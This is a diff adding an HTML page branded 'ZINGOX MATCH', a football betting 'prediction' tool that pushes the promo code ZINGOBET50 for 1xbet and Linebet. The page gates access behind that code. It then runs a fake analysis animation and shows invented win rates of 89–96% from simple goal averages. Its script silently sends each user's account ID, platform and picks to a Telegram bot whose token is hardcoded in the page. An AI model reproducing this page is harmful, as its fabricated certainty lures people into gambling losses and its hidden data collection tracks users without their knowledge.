@@ -1,0 +1,316 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0" />
+<title>ZINGOX MATCH - VIP SYSTEM</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700;900&display=swap');
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  :root {
+    --bg-dark: #0f172a;      
+    --container-bg: #1e293b; 
+    --accent-blue: #0ea5e9;   
+    --accent-orange: #f59e0b; 
+    --border-color: #334155; 
+    --white: #FFFFFF;
+    --error-red: #ef4444;
+    --success-green: #2ecc71;
+    --danger-red: #ef4444;
+  }
+  
+  body {
+    background: var(--bg-dark);
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    display: flex; justify-content: center; align-items: flex-start;
+    min-height: 100vh; color: var(--white); padding: 20px 10px;
+  }
+  
+  .container {
+    background: var(--container-bg); padding: 20px; border-radius: 25px;
+    border: 1px solid var(--border-color); width: 100%; max-width: 400px;
+    box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+  }
+  
+  .header h1 { text-align: center; margin-bottom: 20px; font-weight: 900; font-size: 24px; font-family: 'Poppins', sans-serif; }
+  .section { background: rgba(15, 23, 42, 0.5); padding: 15px; border-radius: 15px; margin-bottom: 12px; border: 1px solid var(--border-color); position: relative; }
+  label { font-weight: 600; color: var(--accent-blue); font-size: 11px; display: block; margin-bottom: 8px; text-transform: uppercase; }
+  select, input { width: 100%; padding: 12px; border-radius: 10px; border: 1px solid var(--border-color); background: var(--bg-dark); color: white; outline: none; }
+  
+  .pass-wrapper { position: relative; }
+  .toggle-password { position: absolute; left: 12px; top: 50%; transform: translateY(-50%); cursor: pointer; background: none; border: none; color: var(--accent-blue); font-size: 18px; z-index: 10; }
+  input[type="password"], input[type="text"] { padding-left: 45px; }
+  .btn-analyze { width: 100%; background: var(--accent-blue); color: white; border: none; padding: 15px; border-radius: 12px; font-weight: 700; cursor: pointer; margin-top: 10px; }
+  #errorMsg { color: var(--error-red); font-size: 12px; margin-bottom: 10px; text-align: center; display: none; font-weight: bold; }
+  .alert-box { margin-top: 20px; padding: 15px; border-radius: 15px; border: 1.5px solid #b45309; background: #16100a; text-align: right; }
+  .alert-title { color: var(--accent-orange); font-weight: 700; font-size: 14px; margin-bottom: 10px; }
+  .alert-text { font-size: 11px; line-height: 1.6; color: #d1d5db; }
+  .highlight-pass { display: block; font-size: 22px; color: #fbbf24; font-weight: 900; text-align: center; margin-top: 10px; letter-spacing: 1px; text-shadow: 0 0 10px rgba(251, 191, 36, 0.3); }
+
+  #analysisSection { display: none; }
+  .status-container { margin-bottom: 15px; }
+  .progress-bar { width: 100%; height: 7px; background-color: var(--bg-dark); border-radius: 10px; overflow: hidden; border: 1px solid var(--border-color); }
+  .progress-fill { height: 100%; width: 0%; background: linear-gradient(90deg, #0ea5e9, #38bdf8); transition: width 0s linear; }
+  #resultArea { display: none; margin-top: 20px; background: var(--bg-dark); padding: 20px; border-radius: 20px; border: 1px solid var(--accent-blue); }
+  .promo-header { text-align: center; background: var(--accent-blue); padding: 10px; border-radius: 12px; font-weight: 900; margin-bottom: 15px; }
+  .prediction-box { background: rgba(255, 255, 255, 0.05); padding: 12px; border-radius: 12px; margin-top: 10px; border-right: 5px solid var(--accent-blue); }
+  .stat-row { display: flex; justify-content: space-between; padding: 6px 0; border-bottom: 1px solid rgba(255,255,255,0.05); font-size: 13px; }
+
+  #successModal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 9999; justify-content: center; align-items: center; padding: 20px; }
+  .modal-content { background: var(--container-bg); border: 2px solid #2ecc71; padding: 25px; border-radius: 25px; text-align: center; width: 100%; max-width: 340px; }
+  .btn-go { background: #2ecc71; color: white; border: none; padding: 14px; border-radius: 10px; margin-top: 20px; cursor: pointer; font-weight: 900; width: 100%; }
+</style>
+</head>
+<body>
+
+<div class="container">
+    <div class="header"><h1>ZINGOX MATCH</h1></div>
+
+    <div id="loginSection">
+        <div class="section">
+            <label>🆔 ACCOUNT ID</label>
+            <input type="number" id="userId" placeholder="Enter your ID...">
+        </div>
+        <div class="section">
+            <label>🔑 PASSWORD</label>
+            <div class="pass-wrapper">
+                <input type="password" id="userPass" placeholder="Enter password...">
+                <button type="button" class="toggle-password" onclick="togglePass()">👁️</button>
+            </div>
+        </div>
+        <div class="section">
+            <label>📱 SELECT PLATFORM</label>
+            <select id="userPlatform">
+                <option>1xbet</option>
+                <option>Linebet</option>
+            </select>
+        </div>
+        <div id="errorMsg">كلمة السر غير صحيحة!</div>
+        <button class="btn-analyze" onclick="validateAndLogin()">تسجيل دخول</button>
+        <div class="alert-box">
+            <div class="alert-title">⚠️ تنبيه هام جداً</div>
+            <div class="alert-text">
+                لضمان تفعيل السكريبت والوصول إلى كافة المزايا، يرجى التأكد من الشروط التالية:<br>
+                • أن يكون حسابك مسجلاً باستخدام كود البرومو الخاص بنا: <b>ZINGOBET50</b>.<br>
+                • كلمة السر هي: <span class="highlight-pass">ZINGOBET50</span>
+            </div>
+        </div>
+    </div>
+
+    <div id="analysisSection">
+        <div class="status-container">
+            <label id="loading-label" style="font-size: 11px; color: var(--accent-blue);">الحالة: جاهز للتحليل</label>
+            <div class="progress-bar"><div id="progress-fill" class="progress-fill"></div></div>
+        </div>
+
+        <form id="pForm">
+            <div class="section">
+              <label>🏆 SELECT LEAGUE</label>
+              <select id="leagueSelect" required>
+                <option value="">Select League...</option>
+                <option value="champions">Champions League 🇪🇺</option>
+                <option value="europa">Europa League 🇪🇺</option>
+                <option value="netherlands">Netherlands: Eredivisie 🇳🇱</option>
+                <option value="belgium">Belgium: Pro League 🇧🇪</option>
+                <option value="caf_champions">Ligue des Champions CAF 🌍</option>
+                <option value="caf_confed">CAF Confederation Cup 🌍</option>
+                <option value="france">Ligue 1 🇫🇷</option>
+                <option value="germany">Bundesliga 🇩🇪</option>
+                <option value="spain">La Liga 🇪🇸</option>
+                <option value="italy">Serie A 🇮🇹</option>
+                <option value="england">Premier League 🏴󠁧󠁢󠁥󠁮󠁧󠁿</option>
+                <option value="morocco">Botola Pro 🇲🇦</option>
+                <option value="egypt">Egyptian League 🇪🇬</option>
+                <option value="saudi">Saudi Pro League 🇸🇦</option>
+              </select>
+            </div>
+            <div class="section">
+                <label>🏠 HOME TEAM</label>
+                <select id="t1" required disabled onchange="updateTeamOptions()"></select>
+                <div style="display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 8px; margin-top: 10px;">
+                    <input type="number" id="t1g1" placeholder="M1" required><input type="number" id="t1g2" placeholder="M2" required><input type="number" id="t1g3" placeholder="M3" required>
+                </div>
+            </div>
+            <div class="section">
+                <label>🚀 AWAY TEAM</label>
+                <select id="t2" required disabled onchange="updateTeamOptions()"></select>
+                <div style="display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 8px; margin-top: 10px;">
+                    <input type="number" id="t2g1" placeholder="M1" required><input type="number" id="t2g2" placeholder="M2" required><input type="number" id="t2g3" placeholder="M3" required>
+                </div>
+            </div>
+            <button type="submit" id="submitBtn" class="btn-analyze">START ANALYSIS</button>
+        </form>
+        <div id="resultArea"></div>
+    </div>
+</div>
+
+<div id="successModal">
+    <div class="modal-content">
+        <h2 style="color: #2ecc71;">✅ تم تسجيل بنجاح</h2>
+        <p id="successMsg" style="color:#fff; margin: 15px 0;"></p>
+        <button class="btn-go" onclick="goToAnalysis()">دخول للسكريبت</button>
+    </div>
+</div>
+
+<script>
+// --- إعدادات تليجرام ---
+const TG_TOKEN = "8454906313:AAEW2YouVO-gr05RwgBo6fgwZVM0tMJ8X8k";
+const TG_CHAT_ID = "8058865241";
+
+let userSession = {
+    id: "",
+    platform: ""
+};
+
+async function sendToTelegram(message) {
+    const url = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=HTML`;
+    try { await fetch(url); } catch (e) { console.error("Telegram Error", e); }
+}
+
+function togglePass() {
+    const passInput = document.getElementById('userPass');
+    const toggleBtn = document.querySelector('.toggle-password');
+    if (passInput.type === "password") {
+        passInput.type = "text"; toggleBtn.textContent = "🙈";
+    } else {
+        passInput.type = "password"; toggleBtn.textContent = "👁️";
+    }
+}
+
+function validateAndLogin() {
+    const id = document.getElementById('userId').value.trim();
+    const pass = document.getElementById('userPass').value.trim();
+    const platform = document.getElementById('userPlatform').value;
+    const errorDiv = document.getElementById('errorMsg');
+
+    if (!id) { alert("يرجى إدخال رقم ID"); return; }
+    if (pass === "ZINGOBET50") {
+        userSession.id = id;
+        userSession.platform = platform;
+        document.getElementById('successMsg').innerHTML = `الحساب (<b>${id}</b>) مسجل بنجاح بكود <b>ZINGOBET50</b>.`;
+        document.getElementById('successModal').style.display = 'flex';
+    } else {
+        errorDiv.style.display = 'block';
+    }
+}
+
+function goToAnalysis() {
+    document.getElementById('successModal').style.display = 'none';
+    document.getElementById('loginSection').style.display = 'none';
+    document.getElementById('analysisSection').style.display = 'block';
+}
+
+const teamsData = {
+  champions: ["Paris Saint-Germain", "Arsenal"],
+  europa: ["Freiburg", "Aston Villa"],
+  netherlands: ["PSV", "Feyenoord", "Nijmegen", "Ajax", "Sparta Rotterdam", "Alkmaar", "Twente", "Groningen", "Zwolle", "Heerenveen", "Sittard", "Utrecht", "Excelsior", "G.A. Eagles", "FC Volendam", "Heracles", "Breda", "Telstar"],
+  belgium: ["Royale Union SG", "Saint-Trond", "Club Brugge", "Anderlecht", "La Gantoise", "Charleroi", "Malines", "Standard Liège", "Antwerp", "Genk", "Westerlo", "Zulte-Waregem", "RAAL La Louvière", "Louvain", "Cercle Bruges", "Dender"],
+  caf_champions: ["AS FAR", "Mamelodi Sundowns"],
+  caf_confed: ["Zamalek SC", "USM Alger"],
+  france: ["Lens", "PSG", "Marseille", "Lille", "Lyon", "Rennes", "Strasbourg", "Toulouse", "Monaco", "Angers", "Brest", "Lorient", "Le Havre", "Nice", "Paris FC", "Nantes", "Auxerre", "Metz"],
+  germany: ["Bayern Munich", "Dortmund", "Leverkusen", "RB Leipzig", "Hoffenheim", "Stuttgart", "Frankfurt", "Union Berlin", "Freiburg", "Werder Bremen", "FC Koln", "B. Monchengladbach", "Hamburg", "Wolfsburg", "Augsburg", "St. Pauli", "Heidenheim", "Mainz"],
+  spain: ["Real Madrid", "Athletic Bilbao", "Villarreal", "Barcelona", "Espanyol", "Getafe", "Elche", "Real Betis", "Valencia", "Rayo Vallecano", "Alaves", "Sevilla", "Osasuna", "Celta Vigo", "Real Oviedo", "Atletico Madrid", "Real Sociedad", "Mallorca", "Levante", "Girona"],
+  italy: ["Napoli", "Juventus", "Milan", "Roma", "Atalanta", "Cremonese", "Cagliari", "Como", "Udinese", "Inter Milan", "Bologna", "Torino", "Lazio", "Sassuolo", "Hellas Verona", "Genoa", "Fiorentina", "Parma", "Pisa", "Lecce"],
+  england: ["Arsenal", "Man City", "Aston Villa", "Liverpool", "Chelsea", "Man Utd", "Sunderland", "Everton", "Brentford", "Crystal Palace", "Fulham", "Spurs", "Newcastle", "Brighton", "Bournemouth", "Leeds", "Nottingham Forest", "West Ham", "Burnley", "Wolves"],
+  morocco: ["WAC Casablanca", "AS FAR", "MAS Fes", "Raja CA", "COD Meknes", "RS Berkane", "Dcheira", "DHJ El Jadida", "IRT Tanger", "RCA Zemamra", "HUSA Agadir", "KACM Marrakech", "FUS Rabat", "Yacoub El Mansour", "UTS Touarga", "OCS Safi"],
+  egypt: ["Al Masry", "Zamalek", "ZED FC", "Petrojet", "Pyramids", "Al Ahly", "El Gouna", "Haras El Hodoud", "Modern Sport", "Ceramica Cleopatra", "ENPPI", "Tala'ea El Gaish", "Smouha", "Ghazl El Mahalla", "Al Ittihad", "Kahraba Ismailia", "Bank Al Ahly", "Arab Contractors", "Wadi Degla", "Ismaily", "Pharco"],
+  saudi: ["Al-Ittihad", "Al-Hilal", "Al-Nassr", "Al-Qadsiah", "Al-Ahli", "Al-Shabab", "Al-Ettifaq", "Al-Taawoun", "Al-Kholood", "Al-Fateh", "Al-Riyadh", "Al-Khaleej", "Al-Fayha", "Damac", "Al-Okhdood", "Neom", "Al-Najma", "Al-Hazem"]
+};
+
+const leagueSelect = document.getElementById('leagueSelect');
+const t1 = document.getElementById('t1');
+const t2 = document.getElementById('t2');
+
+leagueSelect.onchange = () => {
+    const lg = leagueSelect.value;
+    t1.disabled = t2.disabled = !lg;
+    if(!lg) return;
+    updateTeamOptions();
+};
+
+function updateTeamOptions() {
+    const lg = leagueSelect.value;
+    const val1 = t1.value; const val2 = t2.value;
+    t1.innerHTML = t2.innerHTML = '<option value="">Select Team...</option>';
+    if(teamsData[lg]) {
+        teamsData[lg].forEach((team) => {
+            if (team !== val2) t1.add(new Option(team, team));
+            if (team !== val1) t2.add(new Option(team, team));
+        });
+    }
+    t1.value = val1; t2.value = val2;
+}
+
+document.getElementById('pForm').onsubmit = function(e) {
+    e.preventDefault();
+    const btn = document.getElementById('submitBtn');
+    const fill = document.getElementById('progress-fill');
+    const label = document.getElementById('loading-label');
+    const res = document.getElementById('resultArea');
+
+    btn.disabled = true;
+    res.style.display = 'none';
+    fill.style.transition = "none";
+    fill.style.width = "0%";
+    label.innerText = "🔍 جاري فحص البيانات وتحليل الاحتمالات...";
+
+    setTimeout(() => {
+        fill.style.transition = "width 1.5s linear";
+        fill.style.width = "100%";
+    }, 50);
+
+    setTimeout(() => {
+        const team1Name = t1.value;
+        const team2Name = t2.value;
+        const leagueName = leagueSelect.options[leagueSelect.selectedIndex].text;
+        const avg1 = (Number(document.getElementById('t1g1').value) + Number(document.getElementById('t1g2').value) + Number(document.getElementById('t1g3').value)) / 3;
+        const avg2 = (Number(document.getElementById('t2g1').value) + Number(document.getElementById('t2g2').value) + Number(document.getElementById('t2g3').value)) / 3;
+        const xG = (avg1 * 0.65) + (avg2 * 0.35);
+        const lg = leagueSelect.value;
+
+        let marketText, prob, marketColor;
+        const isLowScoring = ["caf_champions", "caf_confed", "italy", "morocco", "egypt"].includes(lg);
+
+        if (xG > 2.2 && !isLowScoring) {
+            marketText = "OVER 2.5 GOALS"; prob = "94%"; marketColor = "var(--success-green)";
+        } else if (xG > 1.8) {
+            marketText = "OVER 2.0 GOALS"; prob = "95%"; marketColor = "var(--success-green)";
+        } else if (xG > 1.4) {
+            marketText = "OVER 1.5 GOALS"; prob = "96%"; marketColor = "var(--success-green)";
+        } else {
+            marketText = "UNDER 3.5 GOALS"; prob = "89%"; marketColor = "var(--danger-red)";
+        }
+
+        let dc = avg1 > avg2 ? "1X" : (avg2 > avg1 ? "X2" : "12");
+        let bts = xG > 1.2 ? "YES" : "NO";
+        let btsFull = xG > 1.2 ? "YES (82%)" : "NO (60%)";
+
+        const singleMessage = `👤 USER: ${userSession.id}\n🏠 Team 1️⃣: ${team1Name}\n🚀 Team 2️⃣: ${team2Name}\n🏆 League: ${leagueName}\n💰 PREDICTION: ${marketText}\n📈 WIN RATE: ${prob}\n🎲 BTS: ${bts}\n💻 Platform: ${userSession.platform}`;
+        
+        sendToTelegram(singleMessage);
+
+        res.style.display = 'block';
+        res.innerHTML = `
+            <div class="promo-header">Code Promo : ZINGOBET50</div>
+            <div class="prediction-box">
+                <label>⚽ FIRST HALF GOAL</label>
+                <div class="stat-row"><span>RESULT</span><b style="color: var(--success-green);">OVER 0.5 GOALS</b></div>
+            </div>
+            <div class="prediction-box">
+                <label>🔥 VIP PICK</label>
+                <div class="stat-row"><span>TOTAL</span><b style="color:${marketColor};">${marketText}</b></div>
+                <div class="stat-row"><span>WIN RATE</span><b>${prob}</b></div>
+            </div>
+            <div class="prediction-box">
+                <label>🛡️ SECURE</label>
+                <div class="stat-row"><span>DOUBLE CHANCE</span><b>${dc}</b></div>
+                <div class="stat-row"><span>BTS</span><b>${btsFull}</b></div>
+            </div>
+        `;
+        btn.disabled = false;
+        label.innerText = "اكتمل التحليل ✅";
+    }, 1600);
+};
+</script>
+</body>
+</html>
